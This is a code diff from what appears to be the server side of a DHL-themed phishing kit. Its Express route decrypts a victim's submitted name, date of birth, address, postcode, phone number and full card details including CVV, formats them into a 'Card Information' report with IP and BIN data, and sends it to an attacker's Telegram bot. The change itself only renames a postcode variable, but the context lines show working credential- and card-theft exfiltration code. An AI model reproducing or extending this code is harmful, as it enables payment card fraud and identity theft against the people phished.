@@ -35,7 +35,7 @@ app.post('/masonDHL', (req, res) => {
     fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
     dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
     address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
-    postcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
+    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
     telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
     ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
     ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
@@ -60,7 +60,7 @@ app.post('/masonDHL', (req, res) => {
         }
     }).then(function () {
         binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
-        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
         if (mason == 6) {
             axios.post(
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
